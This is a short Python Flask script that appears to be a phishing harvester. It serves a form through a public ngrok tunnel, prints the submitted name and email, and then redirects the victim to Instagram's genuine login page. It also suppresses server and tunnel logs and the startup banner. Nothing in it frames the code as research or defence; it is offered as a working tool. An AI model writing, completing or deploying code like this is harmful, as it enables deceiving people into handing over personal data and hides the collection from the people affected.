import logging
from flask import Flask, request, render_template, redirect
from pyngrok import ngrok
import os

# Suppress Flask and Werkzeug logs
log = logging.getLogger('werkzeug')
log.setLevel(logging.ERROR)


# Suppress pyngrok logs
logging.getLogger("pyngrok").setLevel(logging.ERROR)
app = Flask(__name__)

@app.route("/", methods=["GET", "POST"])
def form():
    if request.method == "POST":
        name = request.form["name"]
        email = request.form["email"]
        print(f"✅ Received data: Name = {name}, Email = {email}")
        return redirect("https://www.instagram.com/accounts/login/")
    return render_template("index.htm")

if __name__ == "__main__":
    public_url = ngrok.connect(5000)
    print("🌍 Public URL:", public_url)
    # Don't show startup info
import sys
cli = sys.modules['flask.cli']
cli.show_server_banner = lambda *x: None

app.run(port=5000, debug=False)

